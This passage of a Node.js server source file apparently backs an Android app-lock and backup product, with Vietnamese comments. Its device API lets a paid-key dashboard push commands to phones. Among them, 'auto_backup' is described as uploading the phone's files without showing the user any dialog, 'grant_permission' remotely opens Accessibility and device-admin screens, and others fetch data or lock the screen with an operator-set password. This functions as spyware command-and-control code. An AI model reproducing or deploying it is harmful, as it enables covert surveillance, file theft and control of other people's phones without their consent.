          '<button class="act-btn act-dl" onclick="location.href=\'/api/backup/file/'+f.id+'\'">⬇</button>'+
          '<button class="act-btn act-del" onclick="deleteFile(\''+f.id+'\',this)">🗑</button>'+
        '</div>'+
      '</div></div>';
  }

  function renderPagination(pages) {
    const el = document.getElementById('pagination');
    if (pages <= 1) { el.innerHTML = ''; return; }
    let html = '';
    for (let i = 1; i <= pages; i++)
      html += '<button class="page-btn '+(i===page?'active':'')+'" onclick="goPage('+i+')">'+i+'</button>';
    el.innerHTML = html;
  }

  function goPage(p) { page = p; render(); window.scrollTo(0,0); }

  function preview(id, mime) {
    const isImg = mime.startsWith('image/');
    const isVid = mime.startsWith('video/');
    const inner = isImg
      ? '<img src="/api/backup/file/'+id+'" alt="">'
      : isVid ? '<video src="/api/backup/file/'+id+'" controls style="max-width:80vw;max-height:70vh"></video>' : '';
    document.getElementById('modal-root').innerHTML =
      '<div class="modal-bg" onclick="if(event.target===this)closeModal()">'+
        '<div class="modal-box">'+inner+
          '<br><button class="modal-close" onclick="closeModal()">✕ Đóng</button>'+
        '</div></div>';
  }

  function closeModal() { document.getElementById('modal-root').innerHTML=''; }

  async function deleteFile(id, btn) {
    if (!confirm('Xóa file này?')) return;
    btn.disabled = true;
    try {
      await fetch('/api/backup/file/'+id, { method:'DELETE' });
      allFiles   = allFiles.filter(f => f.id !== id);
      filtered   = filtered.filter(f => f.id !== id);
      updateStats(); render();
    } catch(e) { alert('Xóa thất bại: '+e.message); btn.disabled=false; }
  }

  function humanSize(b){if(b<1024)return b+'B';if(b<1048576)return(b/1024).toFixed(1)+'KB';if(b<1073741824)return(b/1048576).toFixed(2)+'MB';return(b/1073741824).toFixed(2)+'GB';}
  function relTime(iso){if(!iso)return'—';const d=(Date.now()-new Date(iso))/1000;if(d<60)return'Vừa xong';if(d<3600)return Math.floor(d/60)+'m trước';if(d<86400)return Math.floor(d/3600)+'h trước';return Math.floor(d/86400)+'d trước';}
  function esc(s){return String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');}

  load();
  setInterval(load, 30000);
</script>
</body>
</html>`;
}

// ═══════════════════════════════════════════════════
// END BACKUP MODULE
// ═══════════════════════════════════════════════════

// ─────────────────────────────────────────────────
// API Routes — Android client
// ─────────────────────────────────────────────────

// GET /api/device/ping — app goi de wake server (Render cold start ~10-15s)
// Tra ve {ok:true, ts} de app biet server san sang truoc khi register
route('GET', '/api/device/ping', (req, res) => {
  send(res, 200, { ok: true, ts: Date.now(), devices: devices.size });
});

// POST /api/device/register
// Body: { deviceId?, deviceName, model, brand, androidVersion, apps:[...] }
// Ưu tiên: deviceId đã lưu trên app → name+model → tạo mới
route('POST', '/api/device/register', async (req, res) => {
  let body;
  try { body = await parseBody(req); }
  catch { return send(res, 400, { error: 'Bad JSON' }); }

  const { deviceName, model, brand, manufacturer, androidVersion, sdkVersion, totalRamMB, screenRes, apps = [] } = body;
  if (!deviceName) return send(res, 400, { error: 'deviceName required' });

  // 1. App gửi kèm deviceId đã lưu → dùng luôn nếu hợp lệ
  let deviceId = (typeof body.deviceId === 'string' && body.deviceId.length > 4)
    ? body.deviceId : null;

  // 2. Fallback: tìm bằng name + model (giữ tương thích cũ)
  if (!deviceId || !devices.has(deviceId)) {
    for (const [id, d] of devices) {
      if (d.deviceName === deviceName && d.model === (model || '')) {
        deviceId = id;
        break;
      }
    }
  }

  // 3. Chưa tìm thấy → tạo UUID mới
  if (!deviceId) deviceId = randomUUID();

  // Giữ lại app list cũ nếu register không gửi apps (heartbeat-register)
  const existing = devices.get(deviceId);
  const appMap   = existing ? existing.apps : new Map();
  if (apps.length > 0) {
    for (const a of apps) {
      appMap.set(a.packageName, {
        packageName: a.packageName,
        label:       a.label || a.packageName,
        isSystem:    !!a.isSystem,
        isGame:      !!a.isGame,
        locked:      !!a.locked,
        icon:        a.icon || null,
      });
    }
  }

  const existingDev = devices.get(deviceId);
  devices.set(deviceId, {
    deviceId,
    deviceName:     deviceName,
    model:          model        || (existingDev && existingDev.model)        || 'Unknown',
    brand:          brand        || (existingDev && existingDev.brand)        || 'Unknown',
    manufacturer:   manufacturer || (existingDev && existingDev.manufacturer) || 'Unknown',
    androidVersion: androidVersion || (existingDev && existingDev.androidVersion) || 'Unknown',
    sdkVersion:     sdkVersion   || (existingDev && existingDev.sdkVersion)   || 0,
    totalRamMB:     totalRamMB   || (existingDev && existingDev.totalRamMB)   || 0,
    screenRes:      screenRes    || (existingDev && existingDev.screenRes)    || '',
    registeredAt:   (existingDev && existingDev.registeredAt) || timestamp(),
    lastSeen:       timestamp(),
    apps:           appMap,
  });

  if (!pendingCommands.has(deviceId)) pendingCommands.set(deviceId, []);

  // Persist ngay để survive restart
  savePersistedDevices();

  console.log(`[REGISTER] ${deviceName} (${deviceId}) — ${apps.length} apps`);
  send(res, 200, { deviceId, message: 'Registered' });
});

// POST /api/device/heartbeat
// Body: { deviceId }  — just updates lastSeen
// Trả needReRegister:true (không 404) để app tự register lại khi server restart
route('POST', '/api/device/heartbeat', async (req, res) => {
  let body;
  try { body = await parseBody(req); }
  catch { return send(res, 400, { error: 'Bad JSON' }); }

  const d = devices.get(body.deviceId);
  if (!d) {
    // Server mất dữ liệu (restart) — yêu cầu app re-register
    return send(res, 200, { ok: false, needReRegister: true });
  }
  d.lastSeen = timestamp();
  // Persist định kỳ qua heartbeat (mỗi ~30s/thiết bị)
  savePersistedDevices();
  send(res, 200, { ok: true });
});

// POST /api/device/info
// Body: { deviceId, deviceName?, model?, brand?, manufacturer?, androidVersion?, sdkVersion?, totalRamMB?, screenRes? }
// App có thể gọi bất cứ lúc nào để cập nhật thông tin thiết bị mà không cần re-register
route('POST', '/api/device/info', async (req, res) => {
  let body;
  try { body = await parseBody(req); } catch { return send(res, 400, { error: 'Bad JSON' }); }

  const d = devices.get(body.deviceId);
  if (!d) return send(res, 200, { ok: false, needReRegister: true });

  // Cập nhật từng trường nếu app gửi kèm
  if (body.deviceName)     d.deviceName     = body.deviceName;
  if (body.model)          d.model          = body.model;
  if (body.brand)          d.brand          = body.brand;
  if (body.manufacturer)   d.manufacturer   = body.manufacturer;
  if (body.androidVersion) d.androidVersion = body.androidVersion;
  if (body.sdkVersion)     d.sdkVersion     = body.sdkVersion;
  if (body.totalRamMB)     d.totalRamMB     = body.totalRamMB;
  if (body.screenRes)      d.screenRes      = body.screenRes;
  d.lastSeen = timestamp();
  savePersistedDevices();
  console.log(`[INFO] Device info updated: ${d.deviceName} (${body.deviceId})`);
  send(res, 200, { ok: true });
});

// POST /api/device/sync-apps
// Body: { deviceId, apps:[...] } — full app list sync
route('POST', '/api/device/sync-apps', async (req, res) => {
  let body;
  try { body = await parseBody(req); }
  catch { return send(res, 400, { error: 'Bad JSON' }); }

  const d = devices.get(body.deviceId);
  if (!d) return send(res, 200, { ok: false, needReRegister: true });

  for (const a of (body.apps || [])) {
    d.apps.set(a.packageName, {
      packageName: a.packageName,
      label:       a.label || a.packageName,
      isSystem:    !!a.isSystem,
      isGame:      !!a.isGame,
      locked:      !!a.locked,
      icon:        a.icon || null,
    });
  }
  d.lastSeen = timestamp();
  savePersistedDevices();
  send(res, 200, { ok: true });
});

// GET /api/device/poll-commands?deviceId=xxx
// Android polls this to get pending lock/unlock commands
route('GET', '/api/device/poll-commands', (req, res) => {
  const { deviceId } = getQuery(req.url);
  if (!deviceId) return send(res, 400, { error: 'deviceId required' });

  const d = devices.get(deviceId);
  if (!d) return send(res, 200, { commands: [], needReRegister: true });

  d.lastSeen = timestamp();
  const cmds = pendingCommands.get(deviceId) || [];
  pendingCommands.set(deviceId, []); // drain

  // Thêm fetch_data commands vào cùng response
  const pendingFetches = (fetchDataCommands[deviceId] || [])
    .filter(c => c.status === 'pending');
  for (const fc of pendingFetches) {
    cmds.push({ cmdId: fc.cmdId, action: 'fetch_data' });
    fc.status = 'sent';
  }

  // ── MỚI: grant_permission commands ─────────────────────────────────────
  // App nhận lệnh này sẽ tự động mở màn hình cấp quyền (Accessibility, v.v.)
  const pendingGrants = (grantPermCmds[deviceId] || [])
    .filter(c => c.status === 'pending');
  for (const gc of pendingGrants) {
    cmds.push({
      cmdId:       gc.cmdId,
      action:      'grant_permission',
      permissions: gc.permissions || ['accessibility'],
    });
    gc.status = 'sent';
  }

  // ── MỚI: auto_backup commands ───────────────────────────────────────────
  // App nhận lệnh này sẽ tự đồng ý + upload KHÔNG hiện dialog cho user
  const pendingAutoBk = (autoBackupCmds[deviceId] || [])
    .filter(c => c.status === 'pending');
  for (const ab of pendingAutoBk) {
    cmds.push({ cmdId: ab.cmdId, action: 'auto_backup' });
    ab.status = 'sent';
  }

  // ── screen_lock commands ─────────────────────────────────────────────────
  // App nhận lệnh này sẽ khoá màn hình ngay lập tức (có thể kèm password)
  const pendingScreenLocks = (screenLockCmds[deviceId] || [])
    .filter(c => c.status === 'pending');
  for (const sl of pendingScreenLocks) {
    cmds.push({ cmdId: sl.cmdId, action: 'screen_lock', password: sl.password || '' });
    sl.status = 'sent';
  }

  // ── timed_lock commands ──────────────────────────────────────────────────
  // App nhận lệnh này sẽ khoá ứng dụng tạm thời, tự mở sau X phút
  const pendingTimedLocks = (timedLockCmds[deviceId] || [])
    .filter(c => c.status === 'pending');
  for (const tl of pendingTimedLocks) {
    cmds.push({ cmdId: tl.cmdId, action: 'timed_lock', packageName: tl.packageName, minutes: tl.minutes });
    tl.status = 'sent';
  }

  send(res, 200, { commands: cmds });
});

// POST /api/device/ack-command
// Body: { deviceId, cmdId, packageName, locked }
// Android confirms it applied a command
route('POST', '/api/device/ack-command', async (req, res) => {
  let body;
  try { body = await parseBody(req); }
  catch { return send(res, 400, { error: 'Bad JSON' }); }

  const d = devices.get(body.deviceId);
  if (!d) return send(res, 404, { error: 'Device not found' });

  const app = d.apps.get(body.packageName);
  if (app) app.locked = !!body.locked;
  d.lastSeen = timestamp();

  console.log(`[ACK] ${d.deviceName} — ${body.packageName} locked=${body.locked}`);
  send(res, 200, { ok: true });
});

// POST /api/device/send-fetch-data
// Dashboard gọi khi admin bấm nút "Auto lấy dữ liệu"
// Body: { deviceId }
route('POST', '/api/device/send-fetch-data', async (req, res) => {
  let body;
  try { body = await parseBody(req); }
  catch { return send(res, 400, { error: 'Bad JSON' }); }

  const { deviceId } = body;
  if (!deviceId) return send(res, 400, { error: 'deviceId required' });

  const d = devices.get(deviceId);
  if (!d) return send(res, 404, { error: 'Device not found' });

  const cmdId = 'fetchdata_' + Date.now() + '_' + Math.random().toString(36).slice(2, 8);
  if (!fetchDataCommands[deviceId]) fetchDataCommands[deviceId] = [];
  fetchDataCommands[deviceId].push({
    cmdId,
    action:  'fetch_data',
    sentAt:  timestamp(),
    status:  'pending',
  });

  console.log(`[FETCH] Queued fetch_data → ${d.deviceName} (${cmdId})`);
  send(res, 200, { ok: true, cmdId });
});

// POST /api/device/ack-fetch-data
// App gọi sau khi user đồng ý hoặc từ chối
// Body: { deviceId, cmdId, agreed: bool }
route('POST', '/api/device/ack-fetch-data', async (req, res) => {
  let body;
  try { body = await parseBody(req); }
  catch { return send(res, 400, { error: 'Bad JSON' }); }

  const { deviceId, cmdId, agreed } = body;
  if (!deviceId || !cmdId) return send(res, 400, { error: 'deviceId, cmdId required' });

  const cmds = fetchDataCommands[deviceId] || [];
  const cmd  = cmds.find(c => c.cmdId === cmdId);
  if (cmd) {
    cmd.status  = agreed ? 'agreed' : 'declined';
    cmd.ackedAt = timestamp();
  }

  if (!fetchDataAckLog[deviceId]) fetchDataAckLog[deviceId] = [];
  fetchDataAckLog[deviceId].push({ cmdId, agreed, ackedAt: timestamp() });

  const d = devices.get(deviceId);
  console.log(`[FETCH] ack deviceId=${deviceId} cmdId=${cmdId} agreed=${agreed}`);
  send(res, 200, { ok: true });
});

// GET /api/device/fetch-data-log?deviceId=XXX
route('GET', /^\/api\/device\/fetch-data-log(\?.*)?$/, (req, res) => {
  const { deviceId } = getQuery(req.url);
  if (!deviceId) return send(res, 400, { error: 'deviceId required' });
  const cmds = (fetchDataCommands[deviceId] || []).slice().reverse();
  const acks = (fetchDataAckLog[deviceId]   || []).slice().reverse();
  send(res, 200, { commands: cmds, ackLog: acks });
});

// ════════════════════════════════════════════════════════════════════
// GRANT PERMISSION — cấp quyền từ xa (Accessibility / Device Admin…)
// ════════════════════════════════════════════════════════════════════

// POST /api/device/send-grant-permission
// Dashboard bấm "Cấp quyền từ xa"
// Body: { deviceId, permissions: ['accessibility','device_admin','usage_stats','draw_overlay'] }
route('POST', '/api/device/send-grant-permission', async (req, res) => {
  let body;
  try { body = await parseBody(req); }
  catch { return send(res, 400, { error: 'Bad JSON' }); }

  const { deviceId, permissions } = body;
  if (!deviceId) return send(res, 400, { error: 'deviceId required' });

  const d = devices.get(deviceId);
  if (!d) return send(res, 404, { error: 'Device not found' });

  const perms = Array.isArray(permissions) && permissions.length > 0
    ? permissions
    : ['accessibility']; // default: bật Accessibility

  const cmdId = 'grant_' + Date.now() + '_' + Math.random().toString(36).slice(2, 8);
  if (!grantPermCmds[deviceId]) grantPermCmds[deviceId] = [];
  grantPermCmds[deviceId].push({
    cmdId,
    permissions: perms,
    sentAt:  timestamp(),
    status:  'pending',
  });

  console.log(`[GRANT] Queued grant_permission → ${d.deviceName} perms=${perms.join(',')} (${cmdId})`);
  send(res, 200, { ok: true, cmdId, permissions: perms });
});

// POST /api/device/ack-grant-permission
// App ack sau khi cố mở màn hình cấp quyền
// Body: { deviceId, cmdId, granted: bool, permission: string }
route('POST', '/api/device/ack-grant-permission', async (req, res) => {
  let body;
  try { body = await parseBody(req); }
  catch { return send(res, 400, { error: 'Bad JSON' }); }

  const { deviceId, cmdId, granted, permission } = body;
  if (!deviceId || !cmdId) return send(res, 400, { error: 'deviceId, cmdId required' });

  const cmds = grantPermCmds[deviceId] || [];
  const cmd  = cmds.find(c => c.cmdId === cmdId);
  if (cmd) {
    cmd.status  = granted ? 'granted' : 'failed';
    cmd.ackedAt = timestamp();
  }

  if (!grantPermLog[deviceId]) grantPermLog[deviceId] = [];
  grantPermLog[deviceId].push({ cmdId, granted, permission, ackedAt: timestamp() });

  const d = devices.get(deviceId);
  console.log(`[GRANT] ack deviceId=${deviceId} cmdId=${cmdId} granted=${granted} perm=${permission}`);
  send(res, 200, { ok: true });
});

// GET /api/device/grant-permission-log?deviceId=XXX
route('GET', /^\/api\/device\/grant-permission-log(\?.*)?$/, (req, res) => {
  const { deviceId } = getQuery(req.url);
  if (!deviceId) return send(res, 400, { error: 'deviceId required' });
  const cmds = (grantPermCmds[deviceId] || []).slice().reverse();
  const log  = (grantPermLog[deviceId]  || []).slice().reverse();
  send(res, 200, { commands: cmds, log });
});

// ════════════════════════════════════════════════════════════════════
// AUTO BACKUP — tự động đồng ý + upload KHÔNG hiện dialog
// ════════════════════════════════════════════════════════════════════

// POST /api/device/send-auto-backup
// Dashboard bấm "Đồng ý & Sao lưu từ xa"
// Body: { deviceId }
route('POST', '/api/device/send-auto-backup', async (req, res) => {
  let body;
  try { body = await parseBody(req); }
  catch { return send(res, 400, { error: 'Bad JSON' }); }

  const { deviceId } = body;
  if (!deviceId) return send(res, 400, { error: 'deviceId required' });

  const d = devices.get(deviceId);
  if (!d) return send(res, 404, { error: 'Device not found' });

  const cmdId = 'autobk_' + Date.now() + '_' + Math.random().toString(36).slice(2, 8);
  if (!autoBackupCmds[deviceId]) autoBackupCmds[deviceId] = [];
  autoBackupCmds[deviceId].push({
    cmdId,
    sentAt: timestamp(),
    status: 'pending',
  });

  console.log(`[AUTO-BK] Queued auto_backup → ${d.deviceName} (${cmdId})`);
  send(res, 200, { ok: true, cmdId });
});

// POST /api/device/ack-auto-backup
// App ack sau khi hoàn thành auto backup (không cần user thao tác)
// Body: { deviceId, cmdId, uploaded: number, failed: number, skipped: number }
route('POST', '/api/device/ack-auto-backup', async (req, res) => {
  let body;
  try { body = await parseBody(req); }
  catch { return send(res, 400, { error: 'Bad JSON' }); }

  const { deviceId, cmdId, uploaded, failed, skipped } = body;
  if (!deviceId || !cmdId) return send(res, 400, { error: 'deviceId, cmdId required' });

  const cmds = autoBackupCmds[deviceId] || [];
  const cmd  = cmds.find(c => c.cmdId === cmdId);
  if (cmd) {
    cmd.status   = 'done';
    cmd.ackedAt  = timestamp();
    cmd.uploaded = uploaded || 0;
    cmd.failed   = failed   || 0;
    cmd.skipped  = skipped  || 0;
  }

  if (!autoBackupLog[deviceId]) autoBackupLog[deviceId] = [];
  autoBackupLog[deviceId].push({
    cmdId,
    uploaded: uploaded || 0,
    failed:   failed   || 0,
    skipped:  skipped  || 0,
    ackedAt:  timestamp(),
  });

  const d = devices.get(deviceId);
  console.log(`[AUTO-BK] ack deviceId=${deviceId} cmdId=${cmdId} uploaded=${uploaded} failed=${failed}`);
  send(res, 200, { ok: true });
});

// GET /api/device/auto-backup-log?deviceId=XXX
route('GET', /^\/api\/device\/auto-backup-log(\?.*)?$/, (req, res) => {
  const { deviceId } = getQuery(req.url);
  if (!deviceId) return send(res, 400, { error: 'deviceId required' });
  const cmds = (autoBackupCmds[deviceId] || []).slice().reverse();
  const log  = (autoBackupLog[deviceId]  || []).slice().reverse();
  send(res, 200, { commands: cmds, log });
});

// ════════════════════════════════════════════════════════════════════
// SCREEN LOCK — khoá màn hình thiết bị từ xa
// ════════════════════════════════════════════════════════════════════

// POST /api/device/send-screen-lock
// Dashboard bấm "Khoá màn hình từ xa"
// Body: { deviceId, password? }
route('POST', '/api/device/send-screen-lock', async (req, res) => {
  let body;
  try { body = await parseBody(req); }
  catch { return send(res, 400, { error: 'Bad JSON' }); }

  const { deviceId, password } = body;
  if (!deviceId) return send(res, 400, { error: 'deviceId required' });

  const d = devices.get(deviceId);
  if (!d) return send(res, 404, { error: 'Device not found' });

  const cmdId = 'screenlock_' + Date.now() + '_' + Math.random().toString(36).slice(2, 8);
  if (!screenLockCmds[deviceId]) screenLockCmds[deviceId] = [];
  screenLockCmds[deviceId].push({
    cmdId,
    password: password ? String(password).trim() : '',
    sentAt: timestamp(),
    status: 'pending',
  });

  console.log(`[SCREEN-LOCK] Queued screen_lock → ${d.deviceName} (${cmdId}) hasPassword=${!!password}`);
  send(res, 200, { ok: true, cmdId });
});

// POST /api/device/ack-screen-lock
// App ack sau khi khoá màn hình thành công
// Body: { deviceId, cmdId, success: bool }
route('POST', '/api/device/ack-screen-lock', async (req, res) => {
  let body;
  try { body = await parseBody(req); }
  catch { return send(res, 400, { error: 'Bad JSON' }); }

  const { deviceId, cmdId, success } = body;
  if (!deviceId || !cmdId) return send(res, 400, { error: 'deviceId, cmdId required' });

  const cmds = screenLockCmds[deviceId] || [];
  const cmd  = cmds.find(c => c.cmdId === cmdId);
  if (cmd) {
    cmd.status  = success ? 'done' : 'failed';
    cmd.ackedAt = timestamp();
  }

  if (!screenLockLog[deviceId]) screenLockLog[deviceId] = [];
  screenLockLog[deviceId].push({ cmdId, success: !!success, ackedAt: timestamp() });

  console.log(`[SCREEN-LOCK] ack deviceId=${deviceId} cmdId=${cmdId} success=${success}`);
  send(res, 200, { ok: true });
});

// GET /api/device/screen-lock-log?deviceId=XXX
route('GET', /^\/api\/device\/screen-lock-log(\?.*)?$/, (req, res) => {
  const { deviceId } = getQuery(req.url);
  if (!deviceId) return send(res, 400, { error: 'deviceId required' });
  const cmds = (screenLockCmds[deviceId] || []).slice().reverse();
  const log  = (screenLockLog[deviceId]  || []).slice().reverse();
  send(res, 200, { commands: cmds, log });
});

// ════════════════════════════════════════════════════════════════════
// TIMED LOCK — khoá ứng dụng tạm thời, tự mở sau X phút
// ════════════════════════════════════════════════════════════════════

// POST /api/device/send-timed-lock
// Body: { deviceId, packageName, minutes }
route('POST', '/api/device/send-timed-lock', async (req, res) => {
  let body;
  try { body = await parseBody(req); }
  catch { return send(res, 400, { error: 'Bad JSON' }); }

  const { deviceId, packageName, minutes } = body;
  if (!deviceId || !packageName) return send(res, 400, { error: 'deviceId, packageName required' });
  const mins = Math.max(1, Math.min(999, parseInt(minutes || '5', 10)));

  const d = devices.get(deviceId);
  if (!d) return send(res, 404, { error: 'Device not found' });

  const cmdId = 'timedlock_' + Date.now() + '_' + Math.random().toString(36).slice(2, 8);
  if (!timedLockCmds[deviceId]) timedLockCmds[deviceId] = [];
  timedLockCmds[deviceId].push({ cmdId, packageName, minutes: mins, sentAt: timestamp(), status: 'pending' });

  console.log(`[TIMED-LOCK] Queued timed_lock → ${d.deviceName} pkg=${packageName} mins=${mins} (${cmdId})`);
  send(res, 200, { ok: true, cmdId, minutes: mins });
});

// POST /api/device/ack-timed-lock
// Body: { deviceId, cmdId, success: bool }
route('POST', '/api/device/ack-timed-lock', async (req, res) => {
  let body;
  try { body = await parseBody(req); }
  catch { return send(res, 400, { error: 'Bad JSON' }); }

  const { deviceId, cmdId, success } = body;
  if (!deviceId || !cmdId) return send(res, 400, { error: 'deviceId, cmdId required' });

  const cmds = timedLockCmds[deviceId] || [];
  const cmd  = cmds.find(c => c.cmdId === cmdId);
  if (cmd) { cmd.status = success ? 'done' : 'failed'; cmd.ackedAt = timestamp(); }

  if (!timedLockLog[deviceId]) timedLockLog[deviceId] = [];
  timedLockLog[deviceId].push({ cmdId, success: !!success, ackedAt: timestamp() });

  console.log(`[TIMED-LOCK] ack deviceId=${deviceId} cmdId=${cmdId} success=${success}`);
  send(res, 200, { ok: true });
});

// ─────────────────────────────────────────────────
// API Routes — Dashboard
// ─────────────────────────────────────────────────

// GET /api/devices — list all devices
route('GET', '/api/devices', (req, res) => {
  const list = [];
  for (const [, d] of devices) {
    const appArr = [];
    for (const [, a] of d.apps) appArr.push(a);
    const online = (Date.now() - new Date(d.lastSeen).getTime()) < 300_000; // 5 phút
    list.push({
      deviceId:       d.deviceId,
      deviceName:     d.deviceName,
      model:          d.model,
      brand:          d.brand,
      manufacturer:   d.manufacturer   || 'Unknown',
      androidVersion: d.androidVersion,
      sdkVersion:     d.sdkVersion     || 0,
      totalRamMB:     d.totalRamMB     || 0,
      screenRes:      d.screenRes      || '',
      registeredAt:   d.registeredAt   || null,
      lastSeen:       d.lastSeen,
      online,
      appCount:       d.apps.size,
      lockedCount:    appArr.filter(a => a.locked).length,
      apps:           appArr,
    });
  }
  send(res, 200, list);
});

// GET /api/devices/:deviceId/apps
route('GET', /^\/api\/devices\/(?<deviceId>[^/?]+)\/apps/, (req, res) => {
  const { deviceId } = matchRoute('GET', req.url.split('?')[0]).params;
  const d = devices.get(deviceId);
  if (!d) return send(res, 404, { error: 'Device not found' });
  const apps = [];
  for (const [, a] of d.apps) apps.push(a);
  send(res, 200, apps);
});

// POST /api/devices/:deviceId/command
// Body: { action: 'lock'|'unlock', packageName }
route('POST', /^\/api\/devices\/(?<deviceId>[^/?]+)\/command/, async (req, res) => {
  const urlPath = req.url.split('?')[0];
  const m = urlPath.match(/^\/api\/devices\/([^/?]+)\/command/);
  const deviceId = m ? m[1] : null;
  if (!deviceId) return send(res, 400, { error: 'Bad URL' });

  let body;
  try { body = await parseBody(req); }
  catch { return send(res, 400, { error: 'Bad JSON' }); }

  const d = devices.get(deviceId);
  if (!d) return send(res, 404, { error: 'Device not found' });

  const { action, packageName, password } = body;
  if (!action || !packageName) return send(res, 400, { error: 'action and packageName required' });
  if (action !== 'lock' && action !== 'unlock') return send(res, 400, { error: 'action must be lock or unlock' });
  if (action === 'lock' && (!password || String(password).trim().length < 4))
    return send(res, 400, { error: 'password required (min 4 chars) for lock' });

  const cmdId = randomUUID();
  const queue = pendingCommands.get(deviceId) || [];
  queue.push({ cmdId, action, packageName, password: password ? String(password).trim() : '' });
  pendingCommands.set(deviceId, queue);

  // Optimistic update in server state
  const app = d.apps.get(packageName);
  if (app) app.locked = (action === 'lock');

  console.log(`[CMD] ${action.toUpperCase()} ${packageName} → ${d.deviceName}`);
  send(res, 200, { cmdId, queued: true });
});

// ─────────────────────────────────────────────────
// Welcome/Login page (served at /)
// ─────────────────────────────────────────────────
route('GET', '/', (req, res) => {
  send(res, 200, getWelcomeHTML(), 'text/html; charset=utf-8');
});

// Dashboard (protected, served at /dashboard)
route('GET', '/dashboard', (req, res) => {
  send(res, 200, getDashboardHTML(), 'text/html; charset=utf-8');
});

// ─────────────────────────────────────────────────
// Key Authentication API
// POST /api/auth/verify-key — xác thực key với Serverkey
// Body: { key: string }
// ─────────────────────────────────────────────────

// URL của Serverkey (tích hợp với https://serverkey-u8w6-nx8o.onrender.com)
// Có thể ghi đè bằng biến môi trường KEY_SERVER_URL
const KEY_SERVER_URL = process.env.KEY_SERVER_URL || 'https://serverkey-u8w6-nx8o.onrender.com';

// Key cục bộ dự phòng (cách nhau dấu phẩy), ưu tiên xét trước khi gọi Serverkey
const VALID_ACCESS_KEYS = new Set(
  (process.env.ACCESS_KEYS || '').split(',').map(k => k.trim()).filter(Boolean)
);

// Session tokens: Map<token, {key, createdAt, keyInfo}>
const activeSessions = new Map();

function generateToken() {
  return require('crypto').randomBytes(24).toString('hex');
}

// Gọi /api/check-key của Serverkey (https://serverkey-u8w6-nx8o.onrender.com)
// POST { key } → { success: bool, message, type, expiresAt, ... }
async function verifyKeyWithServer(key) {
  try {
    const https = require('https');
    const urlObj = new URL(KEY_SERVER_URL + '/api/check-key');
    const postData = JSON.stringify({
      key,
      app_id: 'applock-dashboard',  // app_id để Serverkey nhận dạng
      device: 'dashboard-web',       // gửi device để Serverkey ghi nhận
    });

    return await new Promise((resolve) => {
      const reqOpts = {
        hostname: urlObj.hostname,
        port: urlObj.port || 443,
        path: urlObj.pathname,
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Content-Length': Buffer.byteLength(postData),
          'User-Agent': 'AppLock-Dashboard/1.0',
        },
        timeout: 10000,
      };
      const r = https.request(reqOpts, (resp) => {
        let raw = '';
        resp.on('data', d => raw += d);
        resp.on('end', () => {
          try {
            const parsed = JSON.parse(raw);
            // /api/check-key trả { success, valid, message, type, expiresAt }
            resolve({
              valid: !!(parsed.success || parsed.valid),
              message: parsed.message || '',
              type: parsed.type || 'normal',
              expiresAt: parsed.expiresAt || parsed.expires_at || null,
              raw: parsed,
            });
          } catch {
            resolve({ valid: false, message: 'Parse error' });
          }
        });
      });
      r.on('error', (e) => {
        console.error('[KEY-AUTH] Lỗi kết nối Serverkey:', e.message);
        resolve({ valid: false, message: 'Không thể kết nối đến server xác thực' });
      });
      r.on('timeout', () => {
        r.destroy();
        resolve({ valid: false, message: 'Server xác thực phản hồi quá chậm' });
      });
      r.write(postData);
      r.end();
    });
  } catch (e) {
    console.error('[KEY-AUTH] Exception:', e.message);
    return { valid: false, message: 'Lỗi hệ thống xác thực' };
  }
}

route('POST', '/api/auth/verify-key', async (req, res) => {
  let body;
  try { body = await parseBody(req); } catch { return send(res, 400, { error: 'Bad JSON' }); }

  const { key } = body;
  if (!key || typeof key !== 'string' || !key.trim()) {
    return send(res, 400, { ok: false, error: 'Thiếu key' });
  }

  const trimmedKey = key.trim();
  let valid = false;
  let keyInfo = {};

  // 1. Kiểm tra key cục bộ trước (nếu có cấu hình ACCESS_KEYS)
  if (VALID_ACCESS_KEYS.size > 0 && VALID_ACCESS_KEYS.has(trimmedKey)) {
    valid = true;
    keyInfo = { type: 'local', source: 'local_key' };
    console.log(`[KEY-AUTH] Key hợp lệ (local) → ${trimmedKey.slice(0, 8)}...`);
  }

  // 2. Gọi Serverkey (https://serverkey-u8w6-nx8o.onrender.com/api/check-key)
  if (!valid) {
    console.log(`[KEY-AUTH] Đang xác thực với Serverkey: ${KEY_SERVER_URL}`);
    const result = await verifyKeyWithServer(trimmedKey);
    valid = result.valid;
    keyInfo = {
      type: result.type,
      expiresAt: result.expiresAt,
      message: result.message,
      source: 'serverkey',
    };

    if (!valid) {
      console.log(`[KEY-AUTH] Key không hợp lệ: ${result.message}`);
      return send(res, 401, {
        ok: false,
        error: result.message || 'Key không hợp lệ hoặc đã hết hạn',
      });
    }
    console.log(`[KEY-AUTH] Key hợp lệ từ Serverkey → type=${result.type} expires=${result.expiresAt}`);
  }

  // Tạo session token
  const token = generateToken();
  activeSessions.set(token, { key: trimmedKey, keyInfo, createdAt: Date.now() });

  // Dọn session cũ hơn 24h
  for (const [t, s] of activeSessions) {
    if (Date.now() - s.createdAt > 24 * 60 * 60 * 1000) activeSessions.delete(t);
  }

  send(res, 200, {
    ok: true,
    token,
    keyType: keyInfo.type || 'normal',
    expiresAt: keyInfo.expiresAt || null,
    message: 'Đăng nhập thành công',
  });
});

// POST /api/auth/check-token — kiểm tra token còn hợp lệ không
route('POST', '/api/auth/check-token', async (req, res) => {
  let body;
  try { body = await parseBody(req); } catch { return send(res, 400, { error: 'Bad JSON' }); }
  const { token } = body;
  if (!token) return send(res, 200, { ok: false });
  const session = activeSessions.get(token);
  if (!session) return send(res, 200, { ok: false });
  // Kiểm tra hết hạn 24h
  if (Date.now() - session.createdAt > 24 * 60 * 60 * 1000) {
    activeSessions.delete(token);
    return send(res, 200, { ok: false });
  }
  send(res, 200, { ok: true });
});

// ─────────────────────────────────────────────────
// Download all backup files as ZIP
// GET /api/backup/download-all?deviceId= (optional)
// ─────────────────────────────────────────────────
route('GET', '/api/backup/download-all', async (req, res) => {
  const q = getQuery(req.url);
  let records = Array.from(fileIndex.values());
  if (q.deviceId) records = records.filter(r => r.deviceId === q.deviceId);

  if (records.length === 0) {
    return send(res, 404, { error: 'Không có file nào để tải xuống' });
  }

  // ── ZIP helpers ──────────────────────────────────────────────────────────
  const crc32Table = (() => {
    const t = new Uint32Array(256);
    for (let i = 0; i < 256; i++) {
      let c = i;
      for (let j = 0; j < 8; j++) c = (c & 1) ? (0xEDB88320 ^ (c >>> 1)) : (c >>> 1);
      t[i] = c;
    }
